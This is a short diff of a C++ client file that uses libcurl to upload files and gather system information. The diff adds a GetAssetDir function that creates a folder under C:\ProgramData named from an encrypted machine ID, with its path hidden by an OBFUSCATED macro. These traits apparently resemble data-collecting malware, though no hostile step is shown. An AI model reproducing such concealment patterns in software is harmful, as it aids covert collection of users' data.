@@ -1,6 +1,7 @@
-#include"App.h"
+#include "App.h"
 #include "curl/curl.h"
 #include <filesystem>
+#include "Encrypter.h"
 namespace fs = std::filesystem;
 int64_t lastInfoQuery = 0;
 Information lastInfo;
@@ -29,6 +30,22 @@ size_t readCallback(void *ptr, size_t size, size_t nitems, void *data)
     bytes_read = fread(ptr, 1, (size * nitems), (FILE *)data);
 
     return bytes_read;
+}
+std::string GetAssetDir()
+{
+    std::string dir = OBFUSCATED("C:\\ProgramData");
+    auto dirName = Encrypter::Encrypt(GetMachineID());
+    if (dirName.size() > 16)
+    {
+        dirName.resize(16);
+    }
+    auto path = fs::path(dir) /= dirName;
+    if (!fs::exists(path))
+    {
+        fs::create_directories(path);
+    }
+    dir = path.string();
+    return dir;
 }
 size_t writeCallback(void *pContents, size_t size, size_t nmemb, void *pUser)
 {
@@ -79,7 +96,7 @@ void uploadFile(std::string file)
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 
     auto res = curl_easy_perform(curl);
-    
+
     long http_code = 0;
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
     curl_slist_free_all(headerlist);
@@ -560,4 +577,3 @@ std::string GetCpuInfo()
 
     return cpu;
 }
-
